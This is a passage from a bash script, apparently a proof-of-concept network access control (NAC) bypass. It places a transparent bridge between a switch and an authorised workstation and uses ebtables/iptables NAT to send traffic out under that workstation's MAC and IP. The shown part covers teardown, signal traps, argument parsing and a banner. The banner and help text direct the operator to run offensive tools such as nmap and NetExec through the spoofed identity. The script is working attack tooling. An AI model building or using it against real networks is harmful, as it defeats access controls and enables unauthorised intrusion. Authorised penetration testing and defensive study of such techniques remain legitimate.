    ok "Masquerade active. Outbound traffic from this host now appears as $COMIP / $COMPMAC."
}

remove_masquerade() {
    debug "Removing masquerade rules..."

    # ebtables: unhook + flush + delete our chain
    "$CMD_EBTABLES" -t nat -D POSTROUTING -j "$NAC_EBT_CHAIN" 2>/dev/null || true
    "$CMD_EBTABLES" -t nat -F "$NAC_EBT_CHAIN" 2>/dev/null || true
    "$CMD_EBTABLES" -t nat -X "$NAC_EBT_CHAIN" 2>/dev/null || true

    # iptables: unhook + flush + delete our chain
    "$CMD_IPTABLES" -t nat -D POSTROUTING -j "$NAC_NAT_CHAIN" 2>/dev/null || true
    "$CMD_IPTABLES" -t nat -F "$NAC_NAT_CHAIN" 2>/dev/null || true
    "$CMD_IPTABLES" -t nat -X "$NAC_NAT_CHAIN" 2>/dev/null || true

    # Default route + neigh + bridge IP
    if [ "$(state_get route_default_added)" = "1" ]; then
        "$CMD_IP" route del default via "$BRGW" dev "$BRINT" 2>/dev/null || true
    fi
    if [ -n "$(state_get neigh_static)" ]; then
        "$CMD_IP" neigh del "$BRGW" dev "$BRINT" 2>/dev/null || true
    fi
    "$CMD_IP" addr del "$BRIP/$BRMASK" dev "$BRINT" 2>/dev/null || true

    rm -f "$STATE_DIR/route_default_added" "$STATE_DIR/neigh_static" \
          "$STATE_DIR/masquerade_active" "$STATE_DIR/chains_installed"
}

#==============================================================================
# Cleanup
#==============================================================================
cleanup_on_error() {
    if [ "$INITIALISED" -eq 1 ] || [ "$CONN_ACTIVE" -eq 1 ] \
       || ([ -d "$STATE_DIR" ] && [ -n "$(ls -A "$STATE_DIR" 2>/dev/null)" ]); then
        full_reset
    fi
}

full_reset() {
    [ "$RESET_DONE" -eq 1 ] && return 0
    RESET_DONE=1
    log "Cleaning up - reverting host state..."

    remove_masquerade
    remove_egress_lock

    # Take bridge down, detach members, delete bridge
    if has_iface "$BRINT"; then
        "$CMD_IP" link set "$BRINT" down 2>/dev/null || true
        for iface in "$SWINT" "$COMPINT"; do
            [ -z "$iface" ] && continue
            if [ "$(iface_master "$iface" 2>/dev/null)" = "$BRINT" ]; then
                "$CMD_IP" link set "$iface" nomaster 2>/dev/null || true
            fi
        done
        "$CMD_IP" link del "$BRINT" 2>/dev/null || true
    fi

    # Restore physical NIC state
    for iface in "$SWINT" "$COMPINT"; do
        [ -z "$iface" ] && continue
        if has_iface "$iface"; then
            "$CMD_IP" link set "$iface" promisc off 2>/dev/null || true
            "$CMD_IP" link set "$iface" up          2>/dev/null || true
        fi
    done

    # Restore sysctls
    [ -n "$(state_get ip_forward)" ]        && write_sysctl net.ipv4.ip_forward                "$(state_get ip_forward)"        || true
    [ -n "$(state_get ipv6_disable_all)" ]  && write_sysctl net.ipv6.conf.all.disable_ipv6     "$(state_get ipv6_disable_all)"  || true
    [ -n "$(state_get br_nf_call_ipt)" ]    && write_sysctl net.bridge.bridge-nf-call-iptables "$(state_get br_nf_call_ipt)"    || true
    [ -n "$(state_get icmp_ignore_bcast)" ] && write_sysctl net.ipv4.icmp_echo_ignore_broadcasts "$(state_get icmp_ignore_bcast)" || true

    # Restore previously-existing default routes
    if [ -s "$STATE_DIR/default_routes.bak" ]; then
        while IFS= read -r r; do
            [ -z "$r" ] && continue
            [[ "$r" == *"dev $BRINT"* ]] && continue   # ours, already deleted
            "$CMD_IP" route add $r 2>/dev/null || true
        done < "$STATE_DIR/default_routes.bak"
    fi

    # Restart stopped services
    if [ -f "$STATE_DIR/ntp_stopped" ]; then
        while IFS= read -r svc; do
            [ -n "$svc" ] && systemctl start "$svc" 2>/dev/null
        done < "$STATE_DIR/ntp_stopped"
    fi
    timedatectl set-ntp true 2>/dev/null || true
    if [ -f "$STATE_DIR/services_stopped" ]; then
        while IFS= read -r svc; do
            [ -n "$svc" ] && systemctl start "$svc" 2>/dev/null
        done < "$STATE_DIR/services_stopped"
    fi

    # Restore NetworkManager management
    if [ -n "$CMD_NMCLI" ] && [ -f "$STATE_DIR/nmcli_unmanaged" ]; then
        while IFS= read -r iface; do
            [ -n "$iface" ] && "$CMD_NMCLI" device set "$iface" managed yes 2>/dev/null
        done < "$STATE_DIR/nmcli_unmanaged"
    fi

    INITIALISED=0
    CONN_ACTIVE=0

    # Persist the run log for forensics, then drop the state dir
    if [ -n "$RUN_LOG" ] && [ -f "$RUN_LOG" ]; then
        local ts; ts="$(date +'%Y%m%d-%H%M%S')"
        cp "$RUN_LOG" "/tmp/nac_bypass-$ts.log" 2>/dev/null || true
    fi
    state_clear
    ok "Cleanup complete."
}

#==============================================================================
# Trap handlers - guarantee cleanup on every exit path.
#==============================================================================
install_trap() {
    [ "$TRAP_INSTALLED" -eq 1 ] && return
    trap 'on_signal INT'  INT
    trap 'on_signal TERM' TERM
    trap 'on_signal HUP'  HUP
    trap 'on_signal QUIT' QUIT
    trap 'on_exit'        EXIT
    TRAP_INSTALLED=1
}
on_signal() {
    echo
    warn "Caught SIG$1 - tearing down before exit."
    full_reset
    trap - EXIT
    case "$1" in
        INT)  exit 130 ;;
        TERM) exit 143 ;;
        HUP)  exit 129 ;;
        QUIT) exit 131 ;;
        *)    exit 1   ;;
    esac
}
on_exit() {
    local rc=$?
    full_reset 2>/dev/null || true
    exit "$rc"
}

#==============================================================================
# Banner & wait loop
#==============================================================================
ready_banner() {
    cat <<EOF

================================================================================
  NAC BYPASS ACTIVE
================================================================================
   Bridge        : $BRINT  (addr $BRIP/$BRMASK, fictional gw $BRGW -> $GWMAC)
   Switch side   : $SWINT (mac $SWMAC)
   Workstation   : $COMPINT
   Identity used : $COMIP / $COMPMAC
   Gateway       : ${GWIP:-?} / $GWMAC
   SNAT range    : $COMIP:$SNAT_RANGE

   The workstation's own traffic continues to flow unmodified through the
   bridge. This host now also egresses the wire as the workstation, and
   replies to its traffic are reverse-NAT'd back here (NOT forwarded on).

   Open another terminal and try:

      ping  -I $BRINT  ${GWIP:-<gateway-ip>}
      nmap  -e $BRINT -S $BRIP -sT -p 22,80,445,3389  10.0.0.0/24
      curl  --interface $BRINT  http://internal.example/

   Press Ctrl+C in THIS terminal to tear everything down and restore host.
================================================================================

EOF
}

main_wait() {
    log "Bridge is live. Press Ctrl+C to tear down."
    # Simple sleep loop; traps do all the cleanup work.
    while :; do sleep 60; done
}

#==============================================================================
# CLI
#==============================================================================
usage() {
    local rc=${1:-0}
    cat <<EOF
$SCRIPT_NAME v$VERSION - transparent-bridge NAC bypass POC

Usage: $SCRIPT_NAME -1 <switch_iface> -2 <workstation_iface> [options]

Required:
  -1 <iface>   NIC plugged into the switch / IP phone
  -2 <iface>   NIC plugged into the authorized workstation

Identity pinning (skips passive learning when -V/-W/-g are all supplied):
  -V <mac>     Workstation MAC
  -W <ip>      Workstation IP
  -g <mac>     Gateway MAC
  -G <ip>      Gateway IP (informational only)

Tuning:
  -t <secs>    Passive-learning timeout (default: ${LEARN_TIMEOUT}s)

Other:
  -r           Reset / cleanup any prior run and exit
  -v           Verbose (DEBUG logs)
  -h           This help

The script ALWAYS cleans up on exit (Ctrl+C, SIGTERM, SIGHUP, error,
normal completion). It runs setup, prints a banner, and blocks waiting for
Ctrl+C. Run your offensive tools (nmap, NetExec, ping, curl, ...) from a
SECOND terminal while the bridge is active.

Examples:
  sudo $SCRIPT_NAME -1 eth1 -2 eth2
  sudo $SCRIPT_NAME -1 eth1 -2 eth2 -v
  sudo $SCRIPT_NAME -1 eth1 -2 eth2 \\
       -V 04:bf:1b:5d:95:e6 -W 10.40.240.10 \\
       -g 00:11:22:33:44:55 -G 10.40.240.1
  sudo $SCRIPT_NAME -r
EOF
    exit "$rc"
}

parse_args() {
    while getopts ":1:2:V:W:g:G:t:rvh" opt; do
        case "$opt" in
            "1") SWINT="$OPTARG" ;;
            "2") COMPINT="$OPTARG" ;;
            V)   COMPMAC_USER="$OPTARG" ;;
            W)   COMIP_USER="$OPTARG" ;;
            g)   GWMAC_USER="$OPTARG" ;;
            G)   GWIP_USER="$OPTARG" ;;
            t)   LEARN_TIMEOUT="$OPTARG" ;;
            r)   OPT_RESET_ONLY=1 ;;
            v)   OPT_VERBOSE=1 ;;
            h)   usage 0 ;;
            \?)  err "Unknown option: -$OPTARG"; usage 2 ;;
            :)   err "Option -$OPTARG requires an argument"; usage 2 ;;
        esac
    done

    [ -n "$COMPMAC_USER" ] && ! is_valid_mac "$COMPMAC_USER" && { err "Invalid -V MAC: '$COMPMAC_USER'"; usage 2; }
    [ -n "$COMIP_USER"   ] && ! is_valid_ip  "$COMIP_USER"   && { err "Invalid -W IP: '$COMIP_USER'";   usage 2; }
    [ -n "$GWMAC_USER"   ] && ! is_valid_mac "$GWMAC_USER"   && { err "Invalid -g MAC: '$GWMAC_USER'";  usage 2; }
    [ -n "$GWIP_USER"    ] && ! is_valid_ip  "$GWIP_USER"    && { err "Invalid -G IP: '$GWIP_USER'";    usage 2; }
    is_uint "$LEARN_TIMEOUT" || { err "-t must be a non-negative integer"; usage 2; }
}

#==============================================================================
# Main
#==============================================================================
main() {
    parse_args "$@"

    # Root check BEFORE we touch anything - so non-root invocations don't
    # trigger spurious cleanup messages.
    [ "$EUID" -eq 0 ] || { err "Must run as root."; exit 1; }

    if [ "$OPT_RESET_ONLY" -eq 1 ]; then
        # Resolve binaries needed for cleanup
        CMD_IP=$(resolve_bin ip)
        CMD_IPTABLES=$(resolve_bin iptables)
        CMD_EBTABLES=$(resolve_bin ebtables)
        CMD_NMCLI=$(resolve_bin nmcli)
        [ -z "$CMD_IP" ] && die "ip(8) not found - cannot reset."

        # Recover the bridge name AND interface names from the state directory
        # if a prior run left it behind. Without this, full_reset can't restore
        # promisc/up state on the right NICs when called from a different shell
        # (or after a kill -9 that bypassed the trap).
        if [ -d "$STATE_DIR" ]; then
            local v
            v=$(state_get bridge_name); [ -n "$v" ] && BRINT="$v"
            v=$(state_get swint);       [ -n "$v" ] && SWINT="$v"
            v=$(state_get compint);     [ -n "$v" ] && COMPINT="$v"
        fi
        state_init
        INITIALISED=1
        full_reset
        exit 0
    fi

    state_init
    install_trap
    preflight
    host_lockdown
    bridge_create

    if ! learn; then
        die "Initial learning failed. See above. Re-run with pinned values or after the workstation re-authenticates."
    fi

    install_masquerade
    ready_banner
    main_wait
}

main "$@"
